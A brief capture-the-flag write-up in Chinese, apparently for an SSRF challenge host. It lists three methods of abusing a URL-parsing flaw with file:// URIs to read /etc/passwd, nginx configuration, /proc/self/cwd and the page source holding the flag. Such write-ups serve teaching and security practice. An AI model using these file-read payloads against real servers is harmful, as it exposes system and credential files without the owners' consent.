## SSRF Flie Access
http://ssrf.orange.tw:81/ 存在URL解析漏洞，可以使用`file://`協議
### 方法1 
`file:///etc/passwd`發現使用者nginx
`file:///etc/nginx/nginx.conf`查看conf
`file:///etc/nginx/sites-enabled/default.conf`找到web root
`file:///www/index.php`取得flag
### 方法2
`file:///proc/self/cwd/index.php`
### 方法3
`file://index.php`
